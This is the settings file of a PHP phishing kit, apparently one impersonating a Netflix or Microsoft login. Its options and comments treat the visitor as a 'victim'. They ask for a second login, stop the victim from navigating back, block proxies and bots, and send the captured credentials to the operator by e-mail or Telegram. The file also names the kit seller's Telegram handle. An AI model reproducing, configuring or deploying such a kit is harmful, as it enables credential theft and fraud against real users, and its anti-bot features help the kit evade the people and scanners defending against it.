<?php

/*

Make sure you setup correct shit.

1 = enabled
0 = disabled

Telegram bot url and chat id are required if you change telegram to 1.

If you want Telegram Bot Message me on Telegram : @f4c3r100

*/

$settings = array(
	"log_user"		=> "1", 						// Log User-Agent, IP and Date
	"print_match"	=> "1", 						// Just For Debug
	"anti-back"		=> "1", 						// Victim Can't Go Back To Session
	"debug"			=> "0", 						// Print Errors
	"proxy_block"	=> "1",							// Detect Proxies & Block Them
	"send_mail"		=> "1", 						// Send E-Mail To Your Mail
	"save_results"	=> "1", 						// Save Results 
	"telegram"		=> "0", 						// Telegram Bots Receiver
	"session_only"	=> "1",							// Only Let Victim Access Password If Enabled
	"double_login"	=> "1",							// Asks For Double Login
	"referer"		=> "https://live.com/", 		// HTTP Referer For Antibots 
	"out"			=> "netflix+login", 				// Outcome Of AntiBots Forward (Google search)
	"email"			=> "youremail", 	// Your E-Mail
	"chat_id"		=> "", 							// Chat ID Of You
	"bot_url"		=> "", 							// Your Bot API Key
);

return $settings;

/*

							*** OTHER NOTES ***

			* LOG FILES DATE|IP|USERAGENT 	==> Logs/logs.txt
			* BLOCKED PROXIES FILE 			==> Logs/proxy-block.txt
			* RESULTS FILE 					==> Logs/results.txt
			* BLACKLIST FILE 				==> home/Bots/blacklist.dat
			* WHITELIST FILE 				==> home/Bots/whitelist.dat
							 
			/!\ DO NOT CHANGE CLIENT.TXT | TEMP.TXT | CAPTURED.TXT /!\


							TELEGRAM : @F4C3R100



*/

?>